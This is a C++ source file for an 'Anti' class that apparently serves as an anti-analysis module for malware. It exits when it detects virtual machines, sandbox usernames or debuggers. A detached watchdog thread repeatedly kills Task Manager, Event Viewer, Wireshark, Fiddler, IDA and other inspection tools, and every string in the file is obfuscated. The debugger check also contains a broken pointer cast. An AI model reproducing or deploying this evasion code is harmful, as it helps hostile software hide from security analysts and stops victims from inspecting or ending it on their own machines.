#include "Anti.h"

// Private funcs

void Anti::toLowerCase(char* ptr, size_t size)
{
	for (uint32_t i = 0; i < size; i++) {
		if (isupper(ptr[i]))
			ptr[i] = tolower(ptr[i]);
	}
}

void Anti::kill_process(const char* process_name) const
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, process_name) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

// Public Funcs

void Anti::check_virtual_machine()
{
	char szUsername[1024];
	DWORD dwUser = sizeof(szUsername);
	GetUserNameA(szUsername, &dwUser);

	std::vector<const char*> blacklisted_users{ "guysa", "george", "john", "JOHN-PC" };

	for (uint32_t i = 0; i < blacklisted_users.size(); i++) {
		if (strcmp(szUsername, blacklisted_users[i]) == 0)
			exit(EXIT_FAILURE);
	}

	std::string sysManufacturer, sysName;
	char buf[1000];
	DWORD sz = 1000;
	int ret;

	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("HARDWARE\\ACPI\\DSDT\\VBOX__"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		exit(EXIT_FAILURE);

	ret = RegGetValueA(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), AY_OBFUSCATE("SystemManufacturer"),
		RRF_RT_ANY, NULL, &buf[0], &sz);

	toLowerCase(buf, strlen(buf));
	sysManufacturer = buf;

	if (ret == ERROR_SUCCESS && (sysManufacturer.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("innotek gmbh")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("qemu")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("Apple inc.")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("kvm")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("system manufacturer")) != std::string::npos)) {
		exit(EXIT_FAILURE);
	}

	ret = RegGetValueA(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), AY_OBFUSCATE("SystemProductName"),
		RRF_RT_ANY, NULL, &buf[0], &sz);

	toLowerCase(buf, strlen(buf));
	sysName = buf;

	if (ret == ERROR_SUCCESS && (sysName.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("virtualbox")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("dell")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("qemu")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("intel")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("asus")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("system product name")) != std::string::npos)) {
		exit(EXIT_FAILURE);
	}
}

void Anti::check_debugging()
{
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	bool is_debugging = false;
	CheckRemoteDebuggerPresent(processHandle, reinterpret_cast<PBOOL>(is_debugging));
	if (is_debugging) exit(EXIT_FAILURE);
	if (IsDebuggerPresent()) exit(EXIT_FAILURE);
	SetLastError(0);
	OutputDebugStringA(AY_OBFUSCATE("skid"));
	if (GetLastError() != 0) exit(EXIT_FAILURE);
}

// Looks for certain proccesses open
void Anti::check_analyzing()
{
	for (int i = 0; i < this->processes.size(); i++)
		kill_process(this->processes[i]);
	Sleep(250);
}

// Run seperate thread for func, then detach thread
void Anti::watch_dog()
{
	while (true) {
		for (int i = 0; i < this->processes.size(); i++)
			kill_process(this->processes[i]);
		Sleep(250);
	}
}

Anti::Anti(bool& check_virtual_machine, bool& check_debugging, bool& check_analyzing, bool& watch_dog)
{
	if (check_virtual_machine) this->check_virtual_machine();

	if (check_debugging) this->check_debugging();
	if (check_analyzing) {
		const char* taskmgr = AY_OBFUSCATE("Taskmgr.exe");
		const char* ollydbg = AY_OBFUSCATE("ollydbg.exe");
		const char* x32dbg = AY_OBFUSCATE("x32dbg.exe");
		const char* glasswire = AY_OBFUSCATE("glasswire.exe");
		const char* eventvwr = AY_OBFUSCATE("mmc.exe");
		const char* wireshark = AY_OBFUSCATE("wireshark.exe");
		const char* fiddler = AY_OBFUSCATE("Fiddler.exe");
		const char* netlimiter = AY_OBFUSCATE("NLClientApp.exe");
		const char* cheat_engine = AY_OBFUSCATE("cheatengine-x86_64.exe");
		const char* ida = AY_OBFUSCATE("idaq.exe");
		this->processes = { taskmgr, ollydbg, x32dbg, glasswire, eventvwr, wireshark, fiddler, netlimiter, cheat_engine, ida };
		this->check_analyzing();
	}

	if (watch_dog) {
		std::thread wd(&Anti::watch_dog, this);
		wd.detach();
	}
}
